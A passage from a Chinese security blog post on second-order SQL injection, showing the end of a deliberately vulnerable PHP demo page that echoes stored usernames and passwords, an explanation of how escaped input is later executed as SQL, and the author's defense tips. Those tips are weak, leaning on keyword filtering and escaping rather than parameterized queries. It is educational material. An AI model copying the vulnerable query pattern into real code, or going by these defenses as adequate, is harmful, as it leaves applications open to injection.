class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Username&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>].<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Phone:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br>		&#125;<br>	&#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>	&lt;title&gt;SQL二阶注入&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form method=<span class="hljs-string">&quot;post&quot;</span> style=<span class="hljs-string">&quot;margin-left: 35%;&quot;</span> action=<span class="hljs-string">&quot;&quot;</span>&gt;<br>	search id:&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;id&quot;</span>&gt;&lt;br /&gt;<br>	&lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> style=<span class="hljs-string">&quot;margin-left: 20%; color: #00f; background-color: #0af&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>简单解释一下代码，在sql.php中用户可以将数据插入数据库，虽然传过来的数据被过滤了，不过写入的数据库的数据却被还原成用户输入的内容，在1.php中，查询的时候调用到shellcode，原本无害的数据被当作SQL命令执行，造成SQL二阶注入。过程演示，恶意用户构造ShellCode：</p>
+<img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/6.jpg" srcset="/img/loading.gif" lazyload class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入">
+
+<p>这里传进去的Username原本会被addslashes($_POST[‘Username’])转义，不过在存入数据库的时候会被还原：</p>
+<img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/7.jpg" srcset="/img/loading.gif" lazyload class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入">
+
+<p>之后在另一个界面调用到这个数据的时候如果没有经过处理，该数据就会被当成SQL命令执行：</p>
+<img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/8.jpg" srcset="/img/loading.gif" lazyload class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入">
+
+<p>明显可以看出来，Username部分显示的跟用户创建的值不一样，而是数据被当作命令执行后的结果，这就是一个二次注入的SQL漏洞。</p>
+<h5 id="防御方式："><a href="#防御方式：" class="headerlink" title="防御方式："></a>防御方式：</h5><p>对这三个漏洞，不管哪个，建议四步走：</p>
+<ol>
+<li>对用户输入的数据最好都用正则表达式将关键是全部都给过滤掉；</li>
+<li>再使用mysqli_real_escape_sring()处理SQL执行语句；</li>
+<li>对编码进行强制性要求，直接写死，不给机会；</li>
+<li>不使用where语句，使用mysqli自带方法将每一步写死。</li>
+</ol>
+<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>  现在对于这三个漏洞能想起来的也就这么多，这还是在老师的讲解视频的帮助下。这应该算是SQL注入中的高级注入方式了，目前本人还只是菜鸟一枚，对其他的SQL偏门注入了解的不是很深，就不献丑了。如果我的理解还有什么不到位的地方，欢迎表哥表姐们批评教育，请走该通道：</p>
+<img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/QQ.png" srcset="/img/loading.gif" lazyload class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入">
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SQL注入漏洞之文件写入、宽字节注入及二次注入</div>
+      <div>http://example.com/2021/05/09/SQL注入漏洞之文件写入、宽字节注入及二次注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Cayce</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>May 9, 2021</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/05/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="PHP代码审计之代码执行漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP代码审计之代码执行漏洞</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/05/09/CSRF%E5%92%8CSSRF%E5%B8%A6%E6%9D%A5%E7%9A%84WEB%E6%BC%8F%E6%B4%9E/" title="CSRF和SSRF带来的WEB漏洞">
+                        <span class="hidden-mobile">CSRF和SSRF带来的WEB漏洞</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>By Cayce</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
